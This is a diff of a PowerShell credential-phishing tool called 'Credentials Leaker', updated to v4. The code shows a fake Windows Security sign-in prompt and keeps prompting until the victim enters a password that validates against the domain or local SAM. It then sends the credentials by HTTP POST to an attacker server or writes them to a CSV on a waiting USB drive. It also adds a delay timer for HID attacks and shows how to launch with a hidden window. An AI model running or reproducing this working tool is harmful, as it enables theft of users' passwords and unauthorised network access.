@@ -1,12 +1,14 @@
-<#
+﻿<#
 .SYNOPSIS
-    Credentials Leaker v3 By Dviros
-    Author: Dviros
+    Credentials Leaker v4
+    Main Author: Dviros
+    Feature Edits from v3 to v4: apsec
     Required Dependencies: None
     Optional Dependencies: None
- 
+    
 .DESCRIPTION
-    Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and in turn leak it via an HTTP request.
+    Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and Local SAM and in turn leak
+    it via an HTTP request or export to USB.  It also has dynamic export and timer features to allow for different attack scenerios.
 
 .PARAMETER Caption
     Message box title.
@@ -18,7 +20,25 @@
 	External web server IP or FQDN.
 
 .PARAMETER Port
-	Web server's IP.
+    Web Server's Port - SSL Breaks Usage
+    
+.PARAMETER Delivery
+    Leaked Credentials delivery method.  Valid entries: usb/http
+
+.PARAMETER Filename
+    The path and filename of csv file if using USB Delivery.  Entry Syntax: "\PATH\FILENAME.CSV".  Note: the leading \ is necessary.
+
+.PARAMETER usblabel
+    Label of usb drive.
+
+.PARAMETER mode
+    dynamic, static, config.  Dynamic - If USB Drive/Path are valid, script defaults here, else it uses HTTP POST. Static - Uses default param or Pipeline Delivery method.
+    If Delivery Method is USB but given usblabel is not found, it waits in the background until it is, then writes credentials to CSV.  Config - is a "TODO".  
+    Config will define all Params from a given config file.
+
+.PARAMETER timer
+    Timer is how many minutes the script waits after loading itself to memory before presenting the Credentials PopUp.  This is designed to be used primarily in a HID
+    type attack.
 
 .EXAMPLE
     Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080"
@@ -32,20 +52,47 @@
 
  
 param (
-	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 0)]
+	[Parameter(Mandatory = $false,ValueFromPipeline = $true)]
 	[string]$Caption = 'Sign in',
     
-	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 1)]
+	[Parameter(Mandatory = $false,ValueFromPipeline = $true)]
     [string]$Message = 'Enter your credentials',
 
-    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 2)]
-    [string]$Server = '$( Read-Host "Input Server Address (FQDN\IP): " )',
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$Server = "http://YOUR_URL/cl_reader.php?",
 
-    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 3)]
-    [string]$Port = $( Read-Host "Input Server Port: " )
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$Port = "80",
+
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$delivery = "http",
+
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$filename = "\cl_loot\creds.csv",
+
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$usblabel = "cl_loot",
+
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$mode = "dynamic",
+
+    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
+    [string]$timer = $null
 )
+# Find USB Drive by usblabel.  
 
-# Prerequisites
+$path = (Get-WmiObject -Query "Select * from Win32_LogicalDisk where VolumeName='$usblabel'").DeviceID
+
+# Set Mode - Static, Dynamic, or Config File
+
+switch($mode) {
+    static { $method = $delivery }
+    config { <# to be configured#> }
+    dynamic { if ($path) {if (test-path -Path $path) { $method = "usb" } else { $method = "http" }} else { $method = "http" } }
+    
+}
+
+# Add Assemblies and Initiate Count Down
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
 Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
@@ -54,6 +101,11 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 [Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 [Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+if ($timer) { 
+    $timer = ([int]::Parse($timer))*60
+    Start-Sleep -s $timer 
+}
 
 $CurrentDomain_Name = $env:USERDOMAIN
 $ComputerName = $env:COMPUTERNAME
@@ -78,10 +130,39 @@ function Await($WinRtTask, $ResultType) {
     $netTask.Result
 }
 
-function Leaker($domain,$username,$password){
+function Leaker($domain,$username,$password,$ComputerName){
     try{
-        Invoke-WebRequest http://$Server":"$Port/$domain";"$username";"$password -Method GET -ErrorAction Ignore
-        }
+        switch($method) {
+        usb { 
+            if ([string]::isnullorempty($path)) {
+            # To prevent throwing a duplicate event error if process repeats without a clean exit - mostly here for debugging
+                Unregister-Event -SourceIdentifier volumeChange -ErrorAction SilentlyContinue
+            # Setup wait event and wait for drive to be inserted 
+                Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange
+                do{
+                $newEvent = Wait-Event -SourceIdentifier volumeChange
+                $eventType = $newEvent.SourceEventArgs.NewEvent.EventType
+                if ($eventType -eq 2)
+                {
+                $driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName
+                $driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName
+            # If correct drive, it's go time...
+                if ($driveLabel -eq $usblabel) {    
+                    $path = $driveLetter
+                    }          
+                }
+                Remove-Event -SourceIdentifier volumeChange
+                } while ($driveLabel -ne $usblabel) 
+                Unregister-Event -SourceIdentifier volumeChange 
+            }
+                    New-Object -TypeName PSCustomObject -Property @{Username=$username; Password=$password; Domain=$domain; Computer=$ComputerName}
+                     | Select-Object Username,Password,Computer,Domain | Export-Csv -Path $path$filename -NoTypeInformation -Append  
+
+            }
+
+        http {        $post = @{username=$username; password=$password; domain=$domain; computer=$env:COMPUTERNAME}
+                Invoke-WebRequest -UseBasicParsing $Server -method POST -Body $post -ErrorAction Ignore }
+        }}
     catch{}
     }
 
@@ -90,41 +171,41 @@ function Credentials(){
         
         # Where the magic happens
         $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
-        if (!$creds.CredentialPassword -or $creds.CredentialPassword -eq $null){
+          if ([string]::isnullorempty($creds.CredentialPassword)) {
             Credentials
         }
-        if (!$creds.CredentialUserName){
+        if ([string]::isnullorempty($creds.CredentialUserName)){
             Credentials
         }
         else {
             $Username = $creds.CredentialUserName;
             $Password = $creds.CredentialPassword;
-            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
-                $domain = "WORKGROUP"
-                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
-                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
-                    Leaker $domain $Username $Password
-                    $status = $false
-                    exit
-                    }
-                else {
-                    Credentials
-                    }                
-                }
-
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
             $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
-            if ($domain.name -eq $null){
-                Credentials
-            }
-            else {
-                leaker $CurrentDomain_Name $username $password
+
+            if ([string]::isnullorempty($domain.name) -eq $true){
+            $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$env:COMPUTERNAME)
+            if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
+                $domain = "Local"
+                leaker $domain $username $password $ComputerName
                 $status = $false
                 exit
+                    }
+                    else {
+                        Credentials
+                    }
+                }
+
+            if  ([string]::isnullorempty($domain.name) -eq $false) {
+                leaker $CurrentDomain_Name $username $password $ComputerName
+                $status = $false
+                exit
+            }
+             else {
+                Credentials
             }
         }
     }
 }
-
 
 Credentials
